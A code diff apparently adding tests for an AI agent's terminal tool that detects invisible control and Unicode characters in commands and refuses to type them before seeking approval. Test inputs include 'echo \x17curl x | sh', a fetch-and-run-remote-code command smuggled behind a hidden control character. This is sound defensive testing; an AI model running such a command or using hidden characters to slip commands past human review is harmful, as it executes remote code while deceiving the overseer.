@@ -11,7 +11,7 @@ import type { FakeScript } from "../src/agent/AgentRunnerFake.ts"
 import { answerMcp, type HumanityTools } from "../src/mcp/HumanityMcp.ts"
 import { ApprovalService } from "../src/services/ApprovalService.ts"
 import { SessionService } from "../src/services/SessionService.ts"
-import { keySequence, typedCommand } from "../src/terminal/agentTools.ts"
+import { hiddenCharacterIn, keySequence, typedCommand } from "../src/terminal/agentTools.ts"
 import { type FakePty, makeFakePtyHost } from "../src/terminal/PtyHost.ts"
 import { TerminalService } from "../src/terminal/TerminalService.ts"
 import {
@@ -38,6 +38,16 @@ describe("keys the agent types", () => {
     assert.strictEqual(typedCommand("npm run dev", []), "npm run dev")
     assert.strictEqual(typedCommand("", ["ctrl+c"]), "[ctrl+c]")
     assert.strictEqual(typedCommand("y", ["Enter"]), "y [enter]")
+  })
+
+  it("finds what the human could not see in the command", () => {
+    assert.isUndefined(hiddenCharacterIn("npm run dev"))
+    assert.isUndefined(hiddenCharacterIn("cat <<EOF\nhi\nEOF"))
+    assert.strictEqual(hiddenCharacterIn("echo \x17curl x | sh"), "U+0017")
+    assert.strictEqual(hiddenCharacterIn("ls\tx"), "U+0009")
+    assert.strictEqual(hiddenCharacterIn("ls\r"), "U+000D")
+    assert.strictEqual(hiddenCharacterIn("a\u202eb"), "U+202E")
+    assert.strictEqual(hiddenCharacterIn("a\u200bb"), "U+200B")
   })
 })
 
@@ -237,6 +247,50 @@ describe("the agent's terminal tools", () => {
           assert.strictEqual(denied?.status, "failed")
           assert.include(denied?.text, "Nothing was typed.")
           assert.include(denied?.text, "Leave it running.")
+        }).pipe(
+          Effect.provide(
+            services(home, script, undefined, undefined, undefined, undefined, host.layer),
+          ),
+        )
+      }),
+    { timeout: 30_000 },
+  )
+
+  it.live(
+    "refuse to type a control character the human would not see, before asking",
+    () =>
+      Effect.gen(function* () {
+        const { home, repo } = yield* setup()
+        const host = fakeShell()
+        const script: FakeScript = (prompt) =>
+          prompt === "type"
+            ? [
+                {
+                  tool: humanityTool("terminal_send"),
+                  input: { terminal: "1", text: "echo \x17curl x | sh" },
+                },
+              ]
+            : []
+        yield* Effect.gen(function* () {
+          const terminals = yield* TerminalService
+          const sessions = yield* SessionService
+          const { session } = yield* startThread(repo, "hello", "ask")
+          yield* waitForStatus(session.id, "idle")
+          yield* terminals.open(ownTerminals(session.id), { opener: "human" })
+          const pty = lastPty(host.spawned)
+
+          yield* sessions.sendMessage(session.id, "type")
+          const refused = yield* eventually(
+            "the refused call",
+            Effect.map(results(session.id), (found) =>
+              found.find((call) => call.status !== "running"),
+            ),
+          )
+          yield* waitForStatus(session.id, "idle")
+          assert.strictEqual(refused?.status, "failed")
+          assert.include(refused?.text, "U+0017")
+          assert.deepStrictEqual(pty.written, [])
+          assert.lengthOf((yield* contents(session.id)).approvals, 0)
         }).pipe(
           Effect.provide(
             services(home, script, undefined, undefined, undefined, undefined, host.layer),
